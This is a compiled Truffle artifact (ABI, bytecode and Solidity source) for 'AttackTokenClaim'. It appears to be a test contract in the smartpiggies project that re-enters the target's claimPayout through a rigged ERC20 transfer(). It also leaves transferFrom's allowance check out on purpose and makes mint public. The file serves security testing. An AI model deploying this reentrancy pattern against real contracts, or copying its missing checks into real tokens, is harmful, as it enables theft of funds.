{
  "contractName": "AttackTokenClaim",
  "abi": [
    {
      "inputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Approval",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Transfer",
      "type": "event"
    },
    {
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "fallback"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "_decimals",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "",
          "type": "uint8"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        }
      ],
      "name": "allowance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "attackReturn",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "claimAmount",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "count",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "decimals",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "",
          "type": "uint8"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "subtractedValue",
          "type": "uint256"
        }
      ],
      "name": "decreaseAllowance",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "didAttack",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "didRequest",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "didSatisfy",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "addedValue",
          "type": "uint256"
        }
      ],
      "name": "increaseAllowance",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "internalType": "address",
          "name": "receiver",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "mint",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "name",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "nonce",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "",
          "type": "uint8"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "requestReturn",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "satisfyReturn",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "smartpiggies",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "symbol",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "tokenId",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "totalSupply",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "xfer",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "satisfyAuction",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "requestSettlement",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "internalType": "address",
          "name": "recipient",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transfer",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "internalType": "address",
          "name": "sender",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "recipient",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transferFrom",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_claimAmount",
          "type": "uint256"
        }
      ],
      "name": "attack",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_id",
          "type": "uint256"
        }
      ],
      "name": "setTokenId",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "internalType": "address",
          "name": "_smartpiggies",
          "type": "address"
        }
      ],
      "name": "setAddress",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_amount",
          "type": "uint256"
        }
      ],
      "name": "setAmount",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "resetCount",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "resetAttackFlag",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040523480156200001157600080fd5b50604080518082018252600b81526a20ba3a30b1b5aa37b5b2b760a91b6020808301918252835180850190945260048452634154544b60e01b90840152815191929162000061916003916200008d565b508051620000779060049060208401906200008d565b50506005805460ff191660121790555062000132565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f10620000d057805160ff191683800117855562000100565b8280016001018555821562000100579182015b8281111562000100578251825591602001919060010190620000e3565b506200010e92915062000112565b5090565b6200012f91905b808211156200010e576000815560010162000119565b90565b6111ff80620001426000396000f3fe608060405234801561001057600080fd5b506004361061018b5760003560e01c806306661abd1461018d57806306fdde03146101a7578063095ea7b31461022457806317d70f7c1461026457806318160ddd1461026c57806323b872dd14610274578063271f88b4146102aa578063313ce567146102c757806332424aa3146102e557806339509351146102ed57806340c10f191461031957806345a6ab9914610345578063517e2c231461034d57806364dd891a1461035557806370a082311461037257806382bce8cb14610398578063830953ab146103a057806393b2a651146103a857806395d89b41146103b0578063a3da2e4b146103b8578063a457c2d7146103c0578063a59ec025146103ec578063a9059cbb146103f4578063afaafe8f14610420578063affed0e014610428578063ba47c75d14610430578063bf68201514610438578063c11dbafe14610440578063c4a76b8414610448578063c929ccf31461046c578063dd62ed3e14610489578063e30081a0146104b7578063fd895292146104dd575b005b6101956104e5565b60408051918252519081900360200190f35b6101af6104eb565b6040805160208082528351818301528351919283929083019185019080838360005b838110156101e95781810151838201526020016101d1565b50505050905090810190601f1680156102165780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6102506004803603604081101561023a57600080fd5b506001600160a01b038135169060200135610582565b604080519115158252519081900360200190f35b610195610598565b61019561059e565b6102506004803603606081101561028a57600080fd5b506001600160a01b038135811691602081013590911690604001356105a4565b61018b600480360360208110156102c057600080fd5b50356105bb565b6102cf6105c0565b6040805160ff9092168252519081900360200190f35b6102cf6105c9565b6102506004803603604081101561030357600080fd5b506001600160a01b0381351690602001356105d2565b61018b6004803603604081101561032f57600080fd5b506001600160a01b038135169060200135610613565b6101af610621565b61018b6106af565b61018b6004803603602081101561036b57600080fd5b50356107e3565b6101956004803603602081101561038857600080fd5b50356001600160a01b0316610928565b610250610943565b610195610953565b61018b610959565b6101af610a8b565b6101af610aec565b610250600480360360408110156103d657600080fd5b506001600160a01b038135169060200135610b47565b6101af610b83565b6102506004803603604081101561040a57600080fd5b506001600160a01b038135169060200135610bde565b610250610c0b565b6102cf610c1b565b610250610c24565b610250610c34565b610250610c44565b610450610c56565b604080516001600160a01b039092168252519081900360200190f35b61018b6004803603602081101561048257600080fd5b5035610c6a565b6101956004803603604081101561049f57600080fd5b506001600160a01b0381358116916020013516610c6f565b61018b600480360360208110156104cd57600080fd5b50356001600160a01b0316610c9a565b610250610cc2565b60065481565b60038054604080516020601f60026000196101006001881615020190951694909404938401819004810282018101909252828152606093909290918301828280156105775780601f1061054c57610100808354040283529160200191610577565b820191906000526020600020905b81548152906001019060200180831161055a57829003601f168201915b505050505090505b90565b600061058f338484610ccc565b50600192915050565b60075481565b60025490565b60006105b1848484610db8565b5060019392505050565b600855565b60055460ff1690565b60055460ff1681565b3360008181526001602090815260408083206001600160a01b0387168452909152812054909161058f91859061060e908663ffffffff610ef316565b610ccc565b61061d8282610f46565b5050565b600c805460408051602060026001851615610100026000190190941693909304601f810184900484028201840190925281815292918301828280156106a75780601f1061067c576101008083540402835291602001916106a7565b820191906000526020600020905b81548152906001019060200180831161068a57829003601f168201915b505050505081565b60075460095460408051602481019390935260ff82166044808501919091528151808503909101815260649093018152602083018051631ca1806960e21b6001600160e01b03909116178152905183516000936060936101009091046001600160a01b031692620f424092879282918083835b602083106107415780518252601f199092019160209182019101610722565b6001836020036101000a03801982511681845116808217855250505050505090500191505060006040518083038160008787f1925050503d80600081146107a4576040519150601f19603f3d011682016040523d82523d6000602084013e6107a9565b606091505b50805191935091506107c290600a906020840190611084565b505060098054911515600160a81b0260ff60a81b1990921691909117905550565b60088190556006805460018101909155600211156109255760408051306024820152604480820184905282518083039091018152606490910182526020810180516001600160e01b0316631a2fcc8b60e01b1781526009549251825192936000936060936101009092046001600160a01b031692620f42409287928291908083835b602083106108845780518252601f199092019160209182019101610865565b6001836020036101000a03801982511681845116808217855250505050505090500191505060006040518083038160008787f1925050503d80600081146108e7576040519150601f19603f3d011682016040523d82523d6000602084013e6108ec565b606091505b508051919350915061090590600c906020840190611084565b505060098054911515600160b81b0260ff60b81b19909216919091179055505b50565b6001600160a01b031660009081526020819052604090205490565b600954600160c01b900460ff1681565b60085481565b6007546040805160248101929092526000604480840182905282518085039091018152606490930182526020830180516301a16e2d60e61b6001600160e01b039091161781526009549251845192936060936101009091046001600160a01b031692620f4240928792909182918083835b602083106109e95780518252601f1990920191602091820191016109ca565b6001836020036101000a03801982511681845116808217855250505050505090500191505060006040518083038160008787f1925050503d8060008114610a4c576040519150601f19603f3d011682016040523d82523d6000602084013e610a51565b606091505b5080519193509150610a6a90600b906020840190611084565b505060098054911515600160b01b0260ff60b01b1990921691909117905550565b60048054604080516020601f60026000196101006001881615020190951694909404938401819004810282018101909252828152606093909290918301828280156105775780601f1061054c57610100808354040283529160200191610577565b600a805460408051602060026001851615610100026000190190941693909304601f810184900484028201840190925281815292918301828280156106a75780601f1061067c576101008083540402835291602001916106a7565b3360008181526001602090815260408083206001600160a01b0387168452909152812054909161058f91859061060e908663ffffffff61103016565b600b805460408051602060026001851615610100026000190190941693909304601f810184900484028201840190925281815292918301828280156106a75780601f1061067c576101008083540402835291602001916106a7565b6009805460ff60c01b1916600160c01b179055600854600090610c00906107e3565b61058f338484610db8565b600954600160b81b900460ff1681565b60095460ff1681565b600954600160b01b900460ff1681565b600954600160a81b900460ff1681565b6009805460ff60b81b19169055600190565b60095461010090046001600160a01b031681565b600755565b6001600160a01b03918216600090815260016020908152604080832093909416825291909152205490565b600980546001600160a01b0390921661010002610100600160a81b0319909216919091179055565b6000600655600190565b6001600160a01b038316610d115760405162461bcd60e51b81526004018080602001828103825260248152602001806111a76024913960400191505060405180910390fd5b6001600160a01b038216610d565760405162461bcd60e51b81526004018080602001828103825260228152602001806111406022913960400191505060405180910390fd5b6001600160a01b03808416600081815260016020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b6001600160a01b038316610dfd5760405162461bcd60e51b81526004018080602001828103825260258152602001806111826025913960400191505060405180910390fd5b6001600160a01b038216610e425760405162461bcd60e51b815260040180806020018281038252602381526020018061111d6023913960400191505060405180910390fd5b610e4d83838361107f565b6001600160a01b038316600090815260208190526040902054610e76908263ffffffff61103016565b6001600160a01b038085166000908152602081905260408082209390935590841681522054610eab908263ffffffff610ef316565b6001600160a01b0380841660008181526020818152604091829020949094558051858152905191939287169260008051602061116283398151915292918290030190a3505050565b600082820183811015610f3f576040805162461bcd60e51b815260206004820152600f60248201526e14d8599953585d1a0819985a5b1959608a1b604482015290519081900360640190fd5b9392505050565b6001600160a01b038216610fa1576040805162461bcd60e51b815260206004820152601f60248201527f45524332303a206d696e7420746f20746865207a65726f206164647265737300604482015290519081900360640190fd5b610fad6000838361107f565b600254610fc0908263ffffffff610ef316565b6002556001600160a01b038216600090815260208190526040902054610fec908263ffffffff610ef316565b6001600160a01b0383166000818152602081815260408083209490945583518581529351929391926000805160206111628339815191529281900390910190a35050565b600082821115611079576040805162461bcd60e51b815260206004820152600f60248201526e14d8599953585d1a0819985a5b1959608a1b604482015290519081900360640190fd5b50900390565b505050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106110c557805160ff19168380011785556110f2565b828001600101855582156110f2579182015b828111156110f25782518255916020019190600101906110d7565b506110fe929150611102565b5090565b61057f91905b808211156110fe576000815560010161110856fe45524332303a207472616e7366657220746f20746865207a65726f206164647265737345524332303a20617070726f766520746f20746865207a65726f2061646472657373ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef45524332303a207472616e736665722066726f6d20746865207a65726f206164647265737345524332303a20617070726f76652066726f6d20746865207a65726f2061646472657373a265627a7a72315820f20816f00d1b788f78ac269667d8d6650ce43fdbfd59360aed118b37a6ef7cd764736f6c63430005110032",
  "source": "pragma solidity >=0.5.15;\n\nimport \"./SafeMath.sol\";\n\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n\ncontract ERC20 is IERC20 {\n    using SafeMath for uint256;\n\n    mapping (address => uint256) private _balances;\n\n    mapping (address => mapping (address => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n    uint8 public _decimals;\n\n    /**\n     * @dev Sets the values for {name} and {symbol}, initializes {decimals} with\n     * a default value of 18.\n     *\n     * To select a different value for {decimals}, use {_setupDecimals}.\n     *\n     * All three of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor (string memory name, string memory symbol) public {\n        _name = name;\n        _symbol = symbol;\n        _decimals = 18;\n    }\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5,05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is\n     * called.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n     */\n    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n\n    /**\n     * @dev See {IERC20-totalSupply}.\n     */\n    function totalSupply() public view returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {IERC20-balanceOf}.\n     */\n    function balanceOf(address account) public view returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {IERC20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `recipient` cannot be the zero address.\n     * - the caller must have a balance of at least `amount`.\n     */\n    function transfer(address recipient, uint256 amount) public returns (bool) {\n        _transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-allowance}.\n     */\n    function allowance(address owner, address spender) public view returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    /**\n     * @dev See {IERC20-approve}.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 amount) public returns (bool) {\n        _approve(msg.sender, spender, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-transferFrom}.\n     *\n     * Emits an {Approval} event indicating the updated allowance. This is not\n     * required by the EIP. See the note at the beginning of {ERC20};\n     *\n     * Requirements:\n     * - `sender` and `recipient` cannot be the zero address.\n     * - `sender` must have a balance of at least `amount`.\n     * - the caller must have allowance for ``sender``'s tokens of at least\n     * `amount`.\n     */\n    //function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\n    //    _transfer(sender, recipient, amount);\n    //   // _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));\n    //    return true;\n    //}\n\n    function mint(address receiver, uint256 amount)\n      public\n    {\n        _mint(receiver, amount);\n    }\n    /**\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\n        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));\n        return true;\n    }\n\n    /**\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     * - `spender` must have allowance for the caller of at least\n     * `subtractedValue`.\n     */\n    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\n        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));\n        return true;\n    }\n\n    /**\n     * @dev Moves tokens `amount` from `sender` to `recipient`.\n     *\n     * This is internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * Requirements:\n     *\n     * - `sender` cannot be the zero address.\n     * - `recipient` cannot be the zero address.\n     * - `sender` must have a balance of at least `amount`.\n     */\n    function _transfer(address sender, address recipient, uint256 amount) internal {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n        _beforeTokenTransfer(sender, recipient, amount);\n\n        _balances[sender] = _balances[sender].sub(amount);\n        _balances[recipient] = _balances[recipient].add(amount);\n        emit Transfer(sender, recipient, amount);\n    }\n\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\n     * the total supply.\n     *\n     * Emits a {Transfer} event with `from` set to the zero address.\n     *\n     * Requirements\n     *\n     * - `to` cannot be the zero address.\n     */\n    function _mint(address account, uint256 amount) internal {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _beforeTokenTransfer(address(0), account, amount);\n\n        _totalSupply = _totalSupply.add(amount);\n        _balances[account] = _balances[account].add(amount);\n        emit Transfer(address(0), account, amount);\n    }\n\n    /**\n     * @dev Destroys `amount` tokens from `account`, reducing the\n     * total supply.\n     *\n     * Emits a {Transfer} event with `to` set to the zero address.\n     *\n     * Requirements\n     *\n     * - `account` cannot be the zero address.\n     * - `account` must have at least `amount` tokens.\n     */\n    function _burn(address account, uint256 amount) internal {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n        _balances[account] = _balances[account].sub(amount);\n        _totalSupply = _totalSupply.sub(amount);\n        emit Transfer(account, address(0), amount);\n    }\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.\n     *\n     * This is internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     */\n    function _approve(address owner, address spender, uint256 amount) internal {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    /**\n     * @dev Sets {decimals} to a value other than the default one of 18.\n     *\n     * WARNING: This function should only be called from the constructor. Most\n     * applications that interact with token contracts will not expect\n     * {decimals} to ever change, and may work incorrectly if it does.\n     */\n    function _setupDecimals(uint8 decimals_) internal {\n        _decimals = decimals_;\n    }\n\n    /**\n     * @dev Hook that is called before any transfer of tokens. This includes\n     * minting and burning.\n     *\n     * Calling conditions:\n     *\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n     * will be to transferred to `to`.\n     * - when `from` is zero, `amount` tokens will be minted for `to`.\n     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal { }\n}\n\n\ncontract AttackTokenClaim is ERC20 {\n  uint256 public count;\n  uint256 public tokenId;\n  uint256 public claimAmount;\n  uint8 public nonce;\n  address public smartpiggies;\n  bool public didSatisfy;\n  bool public didRequest;\n  bool public didAttack;\n  bool public xfer;\n  string public satisfyReturn;\n  string public requestReturn;\n  string public attackReturn;\n\n  constructor()\n    ERC20(\"AttackToken\", \"ATTK\")\n    public\n  {\n\n  }\n\n  function()\n    external\n  {\n\n  }\n\n  function satisfyAuction()\n    public\n  {\n    bytes memory payload = abi.encodeWithSignature(\"satisfyAuction(uint256,uint8)\",tokenId,nonce);\n    (bool success, bytes memory data) = address(smartpiggies).call.gas(1000000)(payload);\n    satisfyReturn = string(data);\n    didSatisfy = success;\n  }\n\n  function requestSettlement()\n    public\n  {\n    bytes memory payload = abi.encodeWithSignature(\"requestSettlementPrice(uint256,uint256)\",tokenId,0);\n    (bool success, bytes memory data) = address(smartpiggies).call.gas(1000000)(payload);\n    requestReturn = string(data);\n    didRequest = success;\n  }\n  function transfer(address recipient, uint256 amount) public returns (bool) {\n    xfer = true;\n    attack(claimAmount);\n    _transfer(msg.sender, recipient, amount);\n    return true;\n  }\n\n  function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\n    //xfer = true;\n    //attack(claimAmount);\n    _transfer(sender, recipient, amount);\n    // remove allowance check\n    return true;\n  }\n\n  function attack(uint256 _claimAmount)\n    public\n  {\n    claimAmount = _claimAmount;\n    if (count++ < 2) {\n      bytes memory payload = abi.encodeWithSignature(\"claimPayout(address,uint256)\",address(this),_claimAmount);\n      (bool success, bytes memory data) = address(smartpiggies).call.gas(1000000)(payload);\n      attackReturn = string(data);\n      didAttack = success;\n    }\n  }\n\n  function setTokenId(uint256 _id)\n    public\n  {\n      tokenId = _id;\n  }\n\n  function setAddress(address _smartpiggies)\n    public\n  {\n      smartpiggies = _smartpiggies;\n  }\n\n  function setAmount(uint256 _amount)\n    public\n  {\n    claimAmount = _amount;\n  }\n\n  function resetCount() public returns (bool)\n  {\n      count = 0;\n      return true;\n  }\n\n  function resetAttackFlag() public returns (bool)\n  {\n      didAttack = false;\n      return true;\n  }\n}\n",
  "sourcePath": "/home/vagrant/DAPPS/smartpiggiesGithub/smartpiggies/contracts/AttackTokenClaim.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.17+commit.d19bba13.Emscripten.clang"
  },
  "schemaVersion": "3.1.0",
  "updatedAt": "2020-05-12T22:23:18.870Z",
  "devdoc": {
    "methods": {
      "allowance(address,address)": {
        "details": "See {IERC20-allowance}."
      },
      "approve(address,uint256)": {
        "details": "See {IERC20-approve}.     * Requirements:     * - `spender` cannot be the zero address."
      },
      "balanceOf(address)": {
        "details": "See {IERC20-balanceOf}."
      },
      "decimals()": {
